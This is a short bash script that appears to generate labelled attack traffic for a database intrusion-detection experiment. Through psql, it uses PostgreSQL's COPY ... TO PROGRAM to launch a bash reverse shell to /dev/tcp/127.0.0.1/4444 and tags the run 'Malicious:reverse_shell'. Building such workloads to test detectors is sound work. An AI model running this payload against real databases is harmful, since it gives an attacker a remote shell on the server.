#!/usr/bin/env bash
# 4D OOD workload -- adapted from ../attack_workload/attack_reverse_shell.sh (legacy: casce_tpcb, -U postgres).
# Only connection and label changed; the shell command itself is unchanged.
set -u
REPEAT=${REPEAT:-1}
PSQL="psql -X -q -h 127.0.0.1 -d casce_banking"

echo "4D: reverse shell, repeat ${REPEAT}..."
PGAPPNAME="casce_label=Malicious:reverse_shell_r${REPEAT}" \
  $PSQL -U teller -c "COPY (SELECT 1) TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &\" || true';"
